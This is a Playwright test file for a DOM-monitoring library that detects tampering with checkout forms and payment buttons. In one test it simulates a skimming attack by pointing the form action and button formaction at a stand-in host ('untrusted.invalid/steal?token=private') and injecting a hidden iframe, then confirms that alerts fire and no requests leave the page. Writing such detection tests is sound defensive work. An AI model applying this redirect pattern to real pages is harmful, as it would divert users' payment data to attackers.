import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { expect, test } from "@playwright/test";
import type { InspectorOverlay, SentinelAlert, SentinelController, SentinelOptions } from "../../src/types.js";

const bundle = readFileSync(resolve(process.cwd(), "dist/index.global.js"), "utf8");

declare global {
  interface Window {
    SemanticDomSentinel: {
      createSentinel: (options: SentinelOptions) => SentinelController;
      mountInspectorOverlay: (host?: HTMLElement, title?: string) => InspectorOverlay;
    };
    __sentinelAlerts: SentinelAlert[];
    __sentinelController: SentinelController;
  }
}

async function prepare(page: import("@playwright/test").Page, html: string, requests: string[]) {
  await page.route("**/*", async (route) => {
    requests.push(route.request().url());
    await route.abort();
  });
  await page.setContent(html);
  await page.addScriptTag({ content: bundle });
  await page.evaluate(() => {
    const root = document.querySelector("#app");
    if (!root) throw new Error("Missing application root");
    window.__sentinelAlerts = [];
    window.__sentinelController = window.SemanticDomSentinel.createSentinel({
      roots: [root],
      rules: [
        {
          id: "checkout-form",
          selector: "form",
          watchAttributes: ["action", "method"],
        },
        {
          id: "payment-button",
          selector: "button.pay",
          watchAttributes: ["type", "formaction", "aria-label"],
          watchText: true,
        },
      ],
      onAlert: (alert) => window.__sentinelAlerts.push(alert),
    });
  });
}

test("monitors SPA payment changes and injected iframes while making no network requests", async ({ page }) => {
  const attemptedRequests: string[] = [];
  await prepare(page, `
    <main id="app">
      <form id="checkout" action="/checkout">
        <button class="pay" type="submit" formaction="/pay">Pay securely</button>
      </form>
      <p id="route">cart</p>
    </main>
  `, attemptedRequests);

  await page.evaluate(() => {
    document.querySelector("#route")!.textContent = "confirmation";
    document.querySelector("button.pay")!.setAttribute("class", "pay updated");
    document.querySelector("button.pay")!.setAttribute("formaction", "https://untrusted.invalid/steal?token=private");
    document.querySelector("button.pay")!.textContent = "Continue to external payment";
    document.querySelector("form")!.setAttribute("action", "https://untrusted.invalid/submit?token=private");
    const frame = document.createElement("iframe");
    frame.setAttribute("title", "hidden injected frame");
    document.querySelector("#app")!.append(frame);
  });

  await expect.poll(() => page.evaluate(() => window.__sentinelAlerts.length)).toBeGreaterThanOrEqual(4);
  const alerts = await page.evaluate(() => window.__sentinelAlerts);
  expect(alerts.map((alert) => alert.reason)).toContain("attribute-changed");
  expect(alerts.map((alert) => alert.reason)).toContain("text-changed");
  expect(alerts.map((alert) => alert.reason)).toContain("risky-element-added");
  expect(alerts.map((alert) => alert.ruleId)).toContain("checkout-form");
  expect(JSON.stringify(alerts)).not.toContain("untrusted.invalid");
  expect(JSON.stringify(alerts)).not.toContain("private");
  expect(attemptedRequests).toEqual([]);
});

test("a stable SPA class/state update is not reported as a security anomaly", async ({ page }) => {
  const attemptedRequests: string[] = [];
  await prepare(page, `
    <main id="app"><form action="/checkout"><button class="pay" type="submit">Pay</button></form></main>
  `, attemptedRequests);
  await page.evaluate(() => document.querySelector("button.pay")!.classList.add("is-loading"));
  await page.waitForTimeout(20);
  expect(await page.evaluate(() => window.__sentinelAlerts)).toHaveLength(0);
  expect(attemptedRequests).toEqual([]);
});
